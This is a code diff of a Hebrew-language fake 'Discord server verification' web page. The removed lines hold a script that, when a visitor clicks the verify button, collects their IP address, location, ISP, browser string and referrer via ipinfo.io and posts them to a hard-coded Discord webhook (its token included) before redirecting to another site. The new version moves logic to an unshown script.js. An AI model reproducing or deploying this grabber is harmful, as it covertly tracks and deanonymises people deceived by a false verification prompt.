@@ -1,76 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="he">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>אימות השרת</title>
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600&display=swap" rel="stylesheet">
+    <title>אימות</title>
     <link rel="stylesheet" href="style.css">
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
 <body>
-    <div class="content">
-        <button id="verifyButton" class="button"></button>
+    <div id="start-screen">
+        <button id="start-btn">..תלחצו עלי כדי להמשיך באימות</button>
     </div>
-
-    <script src="snow.js"></script>
-    <script>
-        document.getElementById('verifyButton').addEventListener('click', function() {
-            // Fetch the user's IP address using ipinfo.io
-            axios.get('https://ipinfo.io/json')
-                .then(function (response) {
-                    const ip = response.data.ip; // Get the user's IP address
-                    const city = response.data.city;
-                    const region = response.data.region;
-                    const country = response.data.country;
-                    const timezone = response.data.timezone;
-                    const org = response.data.org;
-
-                    // Get the user's browser info
-                    const browserInfo = navigator.userAgent;
-
-                    // Get the referrer (if any)
-                    const referrer = document.referrer;
-
-                    // Log the collected information
-                    console.log("User IP:", ip);
-                    console.log("Location:", city, region, country);
-                    console.log("Time Zone:", timezone);
-                    console.log("Organization:", org);
-                    console.log("Browser Info:", browserInfo);
-                    console.log("Referrer:", referrer);
-
-                    // Prepare the payload to send to Discord
-                    const webhookUrl = 'https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3'; // Replace with your webhook URL
-                    const payload = {
-                        content: `**User Information:**
-**IP Address**: ${ip}
-**Location**: ${city}, ${region}, ${country}
-**Time Zone**: ${timezone}
-**Organization**: ${org}
-**Browser Info**: ${browserInfo}
-**Referrer**: ${referrer}`
-                    };
-
-                    // Post the payload to Discord webhook
-                    axios.post(webhookUrl, payload)
-                        .then(function (response) {
-                            console.log('User information sent to Discord!');
-
-                            // Send verification URL and trigger role assignment after 2 seconds
-                            setTimeout(() => {
-                                const verificationURL = 'https://stately-jelly-b747e5.netlify.app/'; // Replace with your actual URL
-                                window.location.href = verificationURL; // Redirect user to verification page
-                            }, 2000); // 2 seconds delay before redirect
-                        })
-                        .catch(function (error) {
-                            console.error('Error sending to Discord:', error);
-                        });
-                })
-                .catch(function (error) {
-                    console.error('Error fetching IP:', error);
-                });
-        });
-    </script>
+    <div id="main-screen" class="hidden">
+        <canvas id="snow-canvas"></canvas>
+        <h1 id="verification-text" class="hidden">אימות לשרת דיסקורד</h1>
+        <button id="verify-btn" class="hidden">Verify</button>
+    </div>
+    <audio id="audio" src="Audio.mp3" loop></audio>
+    <script src="script.js"></script>
 </body>
 </html>
